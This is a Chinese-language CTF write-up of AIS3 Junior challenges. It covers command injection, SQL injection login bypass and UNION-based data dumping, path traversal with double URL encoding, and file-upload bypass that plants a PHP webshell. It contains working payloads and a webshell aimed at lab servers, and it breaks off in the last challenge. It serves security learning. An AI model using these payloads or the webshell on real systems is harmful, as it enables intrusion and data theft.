---
title: "AIS3 Junior Web "
description: "securi"
date: 2026-08-21
tags: ["AIS3", "security"]
---

# AIS3 Junior Web
## 1.Command Injection-1 
#### 1.觀察題目
首先這題如標題所述是一題Command Injection
所以我先在輸入框測試`127.0.0.1`
他會回傳：
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.032/0.032/0.032/0.000 ms
```
127.0.0.1 是「我自己」的意思(每台電腦都用這個號碼代表自己)。所以這台伺服器 ping 了自己,通了
這代表他是去叫作業系統跑ping，然後再把結果回傳回來由此可發現網站背後做的事,大概是這樣組一句話:
```
ping -c1 【你輸入的東西】
```
然後把整句話交給作業系統執行。輸入 127.0.0.1 → 它執行 ping -c1 127.0.0.1 
#### 2.測試
首先我先在輸入框輸入``127.0.0.1; id``然後執行，他會回傳
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.040 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.040/0.040/0.040/0.000 ms
uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
```
接下來看最後一行可以發現前面是 ping 的結果(正常),但多出來的 uid=1000(appuser) 是 id 的答案，這代表我成功讓伺服器執行我的指令。

現在我能執行任何指令了,但我目前不知道 flag 檔案放在哪個資料夾，所以我用`find`指令搜尋整台機器：
```
127.0.0.1; find / -iname "*flag*" -not -path "/proc/*" 2>/dev/null
```
接下來會回傳：
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.024 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.024/0.024/0.024/0.000 ms
/sys/devices/pnp0/00:04/00:04:0/00:04:0.0/tty/ttyS0/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.16/tty/ttyS16/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.24/tty/ttyS24/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.14/tty/ttyS14/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.22/tty/ttyS22/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.12/tty/ttyS12/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.30/tty/ttyS30/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.20/tty/ttyS20/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.8/tty/ttyS8/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.10/tty/ttyS10/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.29/tty/ttyS29/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.19/tty/ttyS19/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.6/tty/ttyS6/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.27/tty/ttyS27/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.17/tty/ttyS17/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.4/tty/ttyS4/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.25/tty/ttyS25/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.15/tty/ttyS15/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.23/tty/ttyS23/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.13/tty/ttyS13/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.31/tty/ttyS31/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.21/tty/ttyS21/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.9/tty/ttyS9/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.11/tty/ttyS11/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.7/tty/ttyS7/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.28/tty/ttyS28/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.18/tty/ttyS18/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.5/tty/ttyS5/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.26/tty/ttyS26/flags
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/flag.txt
```
在這邊可以發現flag.txt的位置。
既然我知道了flag.txt在哪裡了，所以我這邊用`cat`指令把檔案內容印出來，然後會看到：
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.023 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.023/0.023/0.023/0.000 ms
FLAG{welcome_to_command_injection}
```
所以Flag是：`FLAG{welcome_to_command_injection}
`
## 2.Command Injection-2 
#### 1.觀察題目
首先會看到這題題目跟上一題長得很像，所以我一樣先送`127.0.0.1`
結果伺服器回傳`ping: 127.0.0.1.corp.local: Name or service not known`
但我在這邊觀察到我輸入的是`127.0.0.1`,但錯誤訊息裡寫的是 `127.0.0.1.corp.local`。
由此可發現伺服器在我的輸入後面加了東西
接下來我輸入了上一題的解法`127.0.0.1; id`，結果回傳
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.024 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.024/0.024/0.024/0.000 ms
/bin/sh: 1: id.corp.local: not found
```
這邊我發現到ping成功了但最後一行是錯誤`:id.corp.local: not found`
我把整句拼出來：
```
ping -c1 127.0.0.1 ; id.corp.local
└──────┬─────────┘   └─────┬─────┘
   第一句,成功        第二句,壞掉了
```
這代表.corp.local 黏到我的 id 後面去了,變成 id.corp
但仔細觀察可以發現，錯誤訊息是 not found(找不到這個指令),而不是「不准我這樣做」或「輸入格式錯誤」。這代表系統真的有嘗試執行我塞進去的第二句話，只是名字被尾巴弄髒了.
#### 2.測試
接下來我使用`＃`把後面所有東西都當註解，完全忽略
```
127.0.0.1; id #
```
接下來回傳：
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.023 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.023/0.023/0.023/0.000 ms
uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
```
接下來就會發現成功了最後一行乾乾淨淨 uid=1000(appuser),沒有錯誤訊息。
```
拼起來是這樣:

ping -c1 127.0.0.1 ; id #.corp.local
└──────┬─────────┘  └┬┘ └─────┬────┘
    第一句          第二句   被註解掉,
                            電腦當作沒看到

```
再來我要找flag，所以我輸入了跟上一題依樣的payload，但這邊要記得加`＃`
```
127.0.0.1; find / -iname "*flag*" -not -path "/proc/*" 2>/dev/null #
```
回傳：
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.025 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.025/0.025/0.025/0.000 ms
/sys/devices/pnp0/00:04/00:04:0/00:04:0.0/tty/ttyS0/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.16/tty/ttyS16/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.24/tty/ttyS24/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.14/tty/ttyS14/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.22/tty/ttyS22/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.12/tty/ttyS12/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.30/tty/ttyS30/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.20/tty/ttyS20/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.8/tty/ttyS8/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.10/tty/ttyS10/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.29/tty/ttyS29/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.19/tty/ttyS19/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.6/tty/ttyS6/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.27/tty/ttyS27/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.17/tty/ttyS17/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.4/tty/ttyS4/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.25/tty/ttyS25/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.15/tty/ttyS15/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.23/tty/ttyS23/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.13/tty/ttyS13/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.31/tty/ttyS31/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.21/tty/ttyS21/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.9/tty/ttyS9/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.11/tty/ttyS11/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.7/tty/ttyS7/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.28/tty/ttyS28/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.18/tty/ttyS18/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.5/tty/ttyS5/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.26/tty/ttyS26/flags
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/flag.txt
```
接下來跟上一題依樣可以發現到/flag.txt
再來就是最後一步跟上一題一樣要來讀flag.txt裡面的東西，但要記得加`＃`
```
127.0.0.1; cat /flag.txt #
```
接下來會回傳：
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.025 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.025/0.025/0.025/0.000 ms
FLAG{comment_out_the_suffix}
```
Flag:FLAG{comment_out_the_suffix}
## 3.Command Injection-3 
#### 1.觀察題目
觀察這題會發現他這次連輸入框都不給我
![截圖 2026-08-04 晚上7.35.13](https://hackmd.io/_uploads/SkauAH18fl.png)
我按按看了Run

結果：
![截圖 2026-08-04 晚上7.37.30](https://hackmd.io/_uploads/rkUWJIkLGl.png)
接下來我打開了開發者工具發現到了其實輸入框一直都在，只是type="hidden" 把它藏起來了。我按 Run 的時候,printer 這個值就被送到伺服器
![截圖 2026-08-04 晚上7.39.45](https://hackmd.io/_uploads/Hykqy8k8ze.png)
接下來我直接把`value="printer"`改掉
![截圖 2026-08-04 晚上7.42.43](https://hackmd.io/_uploads/rkxreU1LMl.png)
改完後我按run
![截圖 2026-08-04 晚上7.44.15](https://hackmd.io/_uploads/SJh5gLJ8Gl.png)
這邊可以發現 成功了uid=1000(appuser) 出現了,代表我的指令被執行了。
再來這題跟上一題依樣都要加`＃`，因為伺服器都會自動補上 .corp.local。
```
如果不加 #,會發生:

printer; id
↓ 拼起來變成
ping -c1 printer ; id.corp.local
                   └─────┬─────┘
                  尾巴黏上來了 → 找不到這個指令

加了 # 之後:

ping -c1 printer ; id #.corp.local
                       └────┬────┘
                     被註解掉,忽略
```
再來就是要找flag了一樣的方法,把 hidden 欄位的值改成:
```
printer; ls -la / #
```
![截圖 2026-08-04 晚上7.50.49](https://hackmd.io/_uploads/ByL7ML1Uze.png)
然後按RUN，他就會列出最上層資料夾所有清單了
![截圖 2026-08-04 晚上7.51.38](https://hackmd.io/_uploads/SkPUz81Izx.png)
從圖片可以看到flag.txt就在最上層
再來我要把flag.txt的內容讀出來，所以把值改成:
```
printer; cat /flag.txt #
```
![截圖 2026-08-04 晚上7.54.06](https://hackmd.io/_uploads/HkcJ7I1Ize.png)
然後按RUN
![截圖 2026-08-04 晚上7.55.25](https://hackmd.io/_uploads/HJcNQUkLze.png)
Flag:FLAG{hidden_field_visible_with_f12}
## 4.SQLi-1 
#### 1.觀察題目
首先觀察到這個題目是一個登入系統有username和password的輸入框，我先試了最常見的帳密admin admin，結果登入失敗了
網站要驗證我的帳密,它得去資料庫查:「有沒有一筆資料的帳號是 admin、密碼是 admin?」，這時候資料庫語言通常是My SQL

翻成白話:
▎ 從使用者表格裡,找出「帳號 = 我打的」而且「密碼 = 我打的」的那一筆
- 找得到 → 登入成功
- 找不到 → 登入失敗
可以注意那些單引號 '。 它們的功能是框住你的輸入,告訴資料庫「引號裡面是一段文字」。
所以我其實輸入 admin / admin,實際變成:
```
... WHERE username = 'admin' AND password = 'admin'
```
資料庫查了,沒這組,所以回傳「沒有」,登入失敗。
#### 2.測試
我在這邊想到了一個測試方式，如果我在帳號欄位裡自己打一個引號`'`會怎樣?因為如果假設你只會乖乖打字母,所以他直接把你的輸入貼進句子裡。但引號在 SQL 裡是有特殊意義的符號,不是普通文字，所以接下來我要動手注入，所以我在username欄位輸入了`admin' OR '1'='1`，然後密碼我是隨便亂輸入
![截圖 2026-08-04 晚上8.18.16](https://hackmd.io/_uploads/B18c_8J8fx.png)
接下來我按Sing in
![截圖 2026-08-04 晚上8.19.10](https://hackmd.io/_uploads/Bkop_8y8Gg.png)
他就登入成功了
Flag:FLAG{first_sqli_login_bypass}
雖然拿到了flag，但我們來看看剛剛發生了什麼事，我剛剛輸入的那串payload變成了
```
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'x'
                                     └──┬──┘ └────┬───┘
                                      條件A      條件B
```
主要重點是在中間的 `OR '1'='1'`。
- OR 的意思是「或者」——只要其中一個條件成立就算數
- '1'='1' 的意思是「1 等於 1 嗎?」——這永遠是對的
所以整句話會變成:
▎ 找出「帳號是 admin」或者「1 等於 1」的資料
因為「1 等於 1」永遠成立,資料庫就把所有使用者都當成符合條件,回傳了第一筆資料。網站看到「有找到資料」,就認定我登入成功了，所以這樣就可以拿到Flag。
## 5.SQLi-2 
#### 1.觀察題目
這次題目有給了 帳號：shop 密碼：shop123
登入後會看到如下圖可以看到有一個搜尋框
![截圖 2026-08-04 晚上8.24.25](https://hackmd.io/_uploads/BkvWq8J8Mg.png)
根據我的思路目前我是合法使用者了，所以我覺得這題應該是要考可不可以看到不該看的東西，首先我搜尋了apple
![截圖 2026-08-04 晚上8.30.49](https://hackmd.io/_uploads/rJvti8y8Me.png)
可以看到他很正常的回了一筆資料
接下來跟上一題一樣可以理解一下我們搜尋了apple那背後的SQL語法是長什麼樣子
```
SELECT name, price, description FROM products WHERE name LIKE '%【apple】%'
```
白話來說:
▎ 從商品表格裡,找出名稱包含【我打的字】的,把「名稱、價格、介紹」三欄印出來
注意那兩個單引號 '——它們框住你的輸入,告訴資料庫「這中間是一段文字」。
問題跟上一題一樣:工程師把你打的字,直接貼進這句話裡。
#### 2.測試
在這邊我跟上一題一樣都先輸入了`'`，結果查無資料，這是因為我打的引號跑進了那句 SQL,把原本成對的引號打亂了,整句話變成壞掉的語法,資料庫報錯,網站就顯示「查無資料」。
如果引號只是普通文字,結果應該是「找不到名字含有`'`的商品」——看起來一樣,但下一步就能分辨真假。
再來我要確認漏洞所以我在搜尋框輸入`' OR '1'='1`
![截圖 2026-08-04 晚上8.45.36](https://hackmd.io/_uploads/HJJZkvJIfe.png)
結果會看到有3筆結果
```
apple-juice     | 50  | ...
wireless-mouse  | 320 | ...
keyboard-pro    | 990 | ...
```
我們可以拼起來看看發生什麼事
```

... WHERE name LIKE '%' OR '1'='1%'
                     └┬┘ └────┬───┘
                   條件A     條件B

- OR = 「或者」,兩個條件只要一個成立就算
- '1'='1' = 「1 等於 1 嗎?」→ 永遠是對的
```
所以變成「找出名字符合的 或者 1=1 的商品」,而 1 永遠等於 1,每一筆都符合。
接下來我確認了有SQL注入，所以我打算使用UNION SELECT
UNION SELECT在做什麼: 把「另一句完全不同的查詢」的結果,接在原本結果後面一起印出來。
原本印三欄(名稱、價格、介紹),所以我也要湊三個。輸入:
```
xxx' UNION SELECT 1,2,3--
```
![截圖 2026-08-04 晚上8.50.04](https://hackmd.io/_uploads/HJtbewk8fg.png)
從畫面中可以看入成功了因為畫面上的1、2、3是我打進去的
這證明兩件事:欄位數是 3,而且三欄都能顯示我指定的內容。
再來我能顯示任何東西了，,但我不知道資料庫裡有什麼。所以我要先問它
```
xxx' UNION SELECT 1,sqlite_version(),group_concat(name||' :: '||sql,'  ###  ') FROM sqlite_master--
```
![截圖 2026-08-04 晚上8.53.33](https://hackmd.io/_uploads/BkFAeDJUfg.png)
再來可以發現畫面上有重點，products 表格總共有 5 個欄位,但網頁只顯示 3 個(名稱、價格、介紹)。多出來的叫 is_public(是否公開)。
這代表:資料庫裡一定有 is_public = 0(不公開)的商品被藏起來了。

再來知道有東西被藏起來了，所以我要把它找出來
網頁的查詢一定有個條件像 WHERE is_public = 1,所以只給你看三筆。

但我的 UNION 是一句全新的查詢,完全不受那個條件管。

輸入:
```
xxx' UNION SELECT name,is_public,description FROM products--
```
![截圖 2026-08-04 晚上8.57.42](https://hackmd.io/_uploads/H1rCbvyLGg.png)
在畫面上可以清看到Flag
Flag:FLAG{sqli_can_leak_hidden_rows}
## 6.SQLi-3 
#### 1.觀察題目
首先這題跟上一題一樣都有給帳號密碼，帳號: shop 密碼: shop123，然後進行登入
![截圖 2026-08-04 晚上9.30.45](https://hackmd.io/_uploads/SymcYv1Uzg.png)
畫面跟上一題幾乎一樣:一個搜尋框 + 三筆商品的表格(蘋果汁、無線滑鼠、機械鍵盤)。

再來我一樣先測試有沒有注入，所以我在搜尋框裡打`'`
![截圖 2026-08-04 晚上9.32.22](https://hackmd.io/_uploads/B1Hl5PyUMl.png)
結果查無資料（引號打亂了 SQL 的語法,句子壞掉了。）
所以我又測試了`' OR '1'='1`
![截圖 2026-08-04 晚上9.33.39](https://hackmd.io/_uploads/rJWSqwkIMg.png)
結果:三筆商品全出現，確認了有SQL注入
#### 2.測試
再來我測試了測欄位數，表格有三欄,所以先試 3 個:
```
xxx' UNION SELECT 1,2,3--
```
![截圖 2026-08-04 晚上9.35.16](https://hackmd.io/_uploads/SJziqw1Ize.png)
欄位數是 3,而且三欄都能顯示我要的東西
接下來我接著看資料庫有什麼
```
xxx' UNION SELECT 1,sqlite_version(),group_concat(name||' :: '||sql,'  ###  ') FROM sqlite_master--
```
![截圖 2026-08-04 晚上9.36.15](https://hackmd.io/_uploads/ryx-jwyIGx.png)
從畫面可以發現這題的 flag 不在商品表裡,而是在一張叫 secret_notes 的獨立表格，而且它的欄位名稱直接就叫 flag

所以接下來我要把flag找出來，現在我知道:表格叫 secret_notes,裡面有 id 和 flag 兩個欄位，但 UNION 要求三個欄位,而我只有兩個東西要拿，所以我隨便湊一個。 中間那格塞一段固定文字當標籤
```
xxx' UNION SELECT id,'flag',flag FROM secret_notes--
```
![截圖 2026-08-04 晚上9.41.07](https://hackmd.io/_uploads/BJGW2vkIMx.png)
在畫面上可以清楚看到flag
Flag:FLAG{union_select_is_powerful}
## 7.Path Traversal 
#### 1.觀察題目
首先進到這個網站，我看到了輸入框所以我隨便輸入了1
![截圖 2026-08-04 晚上9.44.56](https://hackmd.io/_uploads/ry8kavkUfg.png)
但同時我觀察了網址列
![截圖 2026-08-04 晚上9.48.37](https://hackmd.io/_uploads/rJf6awyUGe.png)
發現
```
http://165.154.226.158:1900/view?path=1
                           └─┬─┘ └┬┘ └┘
                             頁面  參數名 我打的值
```
然後畫面跳出錯誤訊息
![截圖 2026-08-04 晚上9.49.53](https://hackmd.io/_uploads/BJ6-CP1IMx.png)
接下來從第一個線索可以看到參數path，path 中文是「路徑」——這是電腦用來表示「檔案在哪裡」的專有名詞。

所以這個框框不是要你打關鍵字或名字,它要的是一個檔案位置。
再來第二個線索，錯誤訊息說「No such file or directory」

所以結論可以發現它真的拿我打的 1 去硬碟裡找檔案了,找不到才報錯。而且注意——它把我打的 1 原封不動印在錯誤訊息裡,代表沒有做任何檢查或清理

#### 2.測試
再來因為我打過很多ctf，所以我就直接試了`../`
```
 /
          ├── flag.txt      🚩 目標在這層
          └── app/          📍 我在這層
              └── app.py
```
flag.txt 和 app/ 在同一層,都住在 / 底下。而我在 app/ 裡面,所以要先出來才拿得到。
所以我在path後面打了`../falg.txt`，意思是回到上一層目錄然後讀取flag.txt
```
http://165.154.226.158:1900/view?path=../flag.txt
```
![截圖 2026-08-04 晚上9.59.27](https://hackmd.io/_uploads/r10redkIfg.png)
Flag:FLAG{path_traversal_works}
## 8.Path Traversal-2 
#### 1.觀察題目
首先可以看到這題跟上題長得非常像，所以我跟上次一樣先打了1試試
![截圖 2026-08-04 晚上10.05.14](https://hackmd.io/_uploads/HJPibd1Lfl.png)
然後我觀察了網址列一樣打了`../flag.txt`
![截圖 2026-08-04 晚上10.06.45](https://hackmd.io/_uploads/BJEbzdJUfl.png)
結果回傳`Blocked by simple filter`
「被簡單過濾器擋住了」 ——網站裝了防護。
所以現在我要找出過濾器檔哪些字，所以我試了以下這些
![截圖 2026-08-04 晚上10.11.55](https://hackmd.io/_uploads/H1YEX_JUMg.png)
然後我開始從最後一行推理:
a/b 是個完全無害的字串,它卻被擋了。
代表過濾器不是在判斷「我有沒有想跑出去」,它只是單純看到 / 這個符號就擋。

結論:黑名單是 ..、/、\ 這幾個字元。

再來我試了幾個常見繞法
| 方法 | 輸入 | 結果 |
| :--- | :--- | :--- |
| 疊字法 | `....//flag.txt` | Blocked(裡面還是有 ..) |
| 反斜線 | `..\flag.txt` | Blocked(\ 也在黑名單) |
| 編碼法 | `%2fflag.txt` | Blocked |

我發現網址裡有些符號有特殊功能(像 / 分隔資料夾、? 開始參數、& 分隔多個參數)。
那如果我想傳一個「真的只是字元」的斜線就要用 URL 編碼。

規則:% + 該字元的編號(十六進位)
| 字元 | 編號 | 寫成 |
| :--- | :--- | :--- |
| `/` | `2F` | `%2f` |
| `.` | `2E` | `%2e` |
| 空格 | `20` | `%20` |
| `%` | `25` | `%25` |

看最後一行:% 我的編號是 25。

* （為什麼 % 自己也要能編碼?因為它是「編碼的開頭符號」。當我想表達「我要一個真正的百分號,不是編碼標記」時,就得寫 %25。就像在字串裡想打反斜線要寫 \\ 一樣。)

所以 %2f 送到伺服器,伺服器解碼之後會變成 /。
#### 2.測試
接下來我重看之前的步驟
我輸入:  %2fflag.txt      → Blocked
停下來想:我送出去的字元是 %、2、f——裡面沒有斜線!
所以我好奇過濾器為什麼擋我?
原來是因為過濾器看到的不是我送的原始文字,而是「已經解碼過」的版本。
也就是說,伺服器內部的處理順序是:
我送出 %2fflag.txt
        ↓
   ① 解碼  →  變成 /flag.txt
        ↓
   ② 過濾器檢查  →  看到 / → 擋

過濾器站在「解碼之後」。 這就是它的位置。
再來我推出解法他是雙重編碼
```text
編碼一次:  %2f      ← 但這層會被過濾器擋
編碼兩次:  %252f    ← 把上面那個 % 再編成 %25
          └┬┘└┬┘
          %25 2f
```
有了解法之後我就要拿flag了
```
http://165.154.226.158:1903/view?path=%252fflag.txt
```
![截圖 2026-08-04 晚上10.36.13](https://hackmd.io/_uploads/Hk21FdkLzg.png)
Flag:FLAG{url_encode_can_bypass}
## 9.File Upload-1 
#### 1.觀察題目
首先看到題目是有一個具有上傳功能的網站
![截圖 2026-08-04 晚上10.39.49](https://hackmd.io/_uploads/ry7TKuJIzx.png)
然後我用了工具看看他用了什麼服務
![截圖 2026-08-04 晚上10.40.45](https://hackmd.io/_uploads/By3g5dkLfg.png)
可以看到這網站是會執行 PHP 程式
PHP 是一種程式語言,而 Apache 的規則是:
只要檔名結尾是 .php,就不要當文字顯示,要當程式執行。
#### 2.測試
所以我現在要做三件事情
1. 我可以上傳任何檔案(沒有檢查副檔名)
2. 檔案會存進網站的公開資料夾
3. 這台機器看到 .php 就會執行它
        ↓
我上傳一個 .php 檔 = 我在別人的伺服器上放了一支我寫的程式
        ↓
用網址打開它 = 我的程式在別人的伺服器上執行

再來我寫了一隻webshell
```php
<?php echo "PWN:"; system($_GET["c"]); ?>
```
我們來看看這隻webshell在幹嘛
| 部分 | 意思 |
| :--- | :--- |
| `<?php ... ?>` | PHP 程式的開始和結束標記 |
| `$_GET["c"]` | 抓網址上 `?c=` 後面的內容 |
| `system(...)` | 把它當作系統指令執行，並印出結果 |
| `echo "PWN:";` | 先印出 `PWN:` 這幾個字（下面解釋用途） |

白話:「把網址上 c= 後面的東西,拿去伺服器上執行,結果印給我看。」

再來我們寫好web shell就可以在網站上把它上傳
![截圖 2026-08-04 晚上10.49.48](https://hackmd.io/_uploads/S1OM3dJLfe.png)
接下來我們就會看到自己的那串隨機資料夾名

再來我要執行第一個指令
```
http://165.154.226.158:28009/uploads/b7b7964d/shell.php?c=id
```

![截圖 2026-08-04 晚上10.52.01](https://hackmd.io/_uploads/HJks2_y8fg.png)
可以看到我們成功控制伺服器了
再來我們要讀出flag，根據題目flag 在 /var/www/html,先看看那個資料夾裡有什麼:
```
http://165.154.226.158:28009/uploads/b7b7964d/shell.php?c=ls -la /var/www/html
```
![截圖 2026-08-04 晚上10.54.19](https://hackmd.io/_uploads/HkKmadJLfx.png)
找到 flag.txt 了。讀它:
```
http://165.154.226.158:28009/uploads/b7b7964d/shell.php?c=cat /var/www/html/flag.txt
```
![截圖 2026-08-04 晚上10.56.15](https://hackmd.io/_uploads/B1aqaO1LGx.png)
Flag:FLAG{upload_php_exec} 
## 10. File Upload-2 
#### 1.觀察題目
首先可以看到這題跟上一題幾乎一模一樣，但我上傳我上一題的webshell，結果發現他出現了Only image files are supported by the browser validation.
![截圖 2026-08-04 晚上11.05.10](https://hackmd.io/_uploads/rJBnkFy8fx.png)
由此可知這個檢查是「瀏覽器」做的，所以這邊我選擇BurpSuite來抓包並改封包，這邊因為有作檢查所以我把php改成jpg檔
![截圖 2026-08-04 晚上11.50.39](https://hackmd.io/_uploads/BJsDqtyUGe.png)
#### 2.測試
![截圖 2026-08-04 晚上11.14.15](https://hackmd.io/_uploads/S1XeztJIGg.png)
這邊可以看到抓到封包了，然後我們需要把.jpg檔改成.php檔才能送出封包執行
![截圖 2026-08-04 晚上11.14.24](https://hackmd.io/_uploads/rJXXMFkUfx.png)
送出之後
![截圖 2026-08-04 晚上11.15.53](https://hackmd.io/_uploads/HJINfKyLfe.png)
```
http://165.154.226.158:28010/uploads/21eb2d6b/shell.php?c=id
```
![截圖 2026-08-04 晚上11.16.58](https://hackmd.io/_uploads/Hk__MYyLfx.png)
接下來要讀flag
```
http://165.154.226.158:28010/uploads/21eb2d6b/shell.php?c=cat /var/www/html/flag.txt
```
![截圖 2026-08-04 晚上11.18.09](https://hackmd.io/_uploads/r18pzty8zg.png)
Flag:FLAG{frontend_validation_bypass} 
## 11.Linux-1 
#### 1.觀察題目
可以看到題目都列出檔案給我們了，然後我看到falg這個檔案，所以我直接用`cat`這指令把它讀出來
![截圖 2026-08-04 晚上11.23.27](https://hackmd.io/_uploads/ry8-EYJUfe.png)
Flag:FLAG{cat_is_enough_for_the_first_step}
## 12.Linux-2 
#### 1.觀察題目
可以看到這題題目他沒有把檔案列出來，所以我們要自己找
首先我先執行`ls -la`
![截圖 2026-08-04 晚上11.28.43](https://hackmd.io/_uploads/HJOEHFkUfl.png)
會發現沒看到我們要的目標flag.txt

所以接下來我用
```
find / -iname "*flag*" 2>/dev/null
```
來全機搜尋flag
![截圖 2026-08-04 晚上11.29.21](https://hackmd.io/_uploads/r1zvBtyLMg.png)
接下來會看到flag在的地方，這時候我們就可以把它`cat /flag                `
![截圖 2026-08-04 晚上11.32.11](https://hackmd.io/_uploads/BJKbUY18zx.png)
Flag:FLAG{learn_to_explore_before_you_read}
## 13.Linux-3 
#### 1.觀察題目
首先可以看到題目說最長拿來讀檔的指令拿掉了，所以顯然不能用cat
不過我們可以先找flag在哪裡
```
find / -iname "*flag*" -not -path "/proc/*" 2>/dev/null
```
一樣全機搜尋
![截圖 2026-08-04 晚上11.36.11](https://hackmd.io/_uploads/BJyZvKJIMl.png)
可以看到我們找到了flag的位置了
既然cat被封我們還可以用`tac /flag`來讀檔
![截圖 2026-08-04 晚上11.37.56](https://hackmd.io/_uploads/HkmwwtyUGe.png)
Flag:FLAG{there_is_more_than_cat}
## 14.The Fist Flag 
![截圖 2026-08-04 晚上11.40.32](https://hackmd.io/_uploads/SyaxutyIMx.png)
Flag:Flag(Thi3_is_the_First_flag)

## 15.Image Viewer 
#### 1.觀察題目
首先可以看到題目是一個貼網址預覽圖片的網頁，我先檢查了他的JavaScript code 
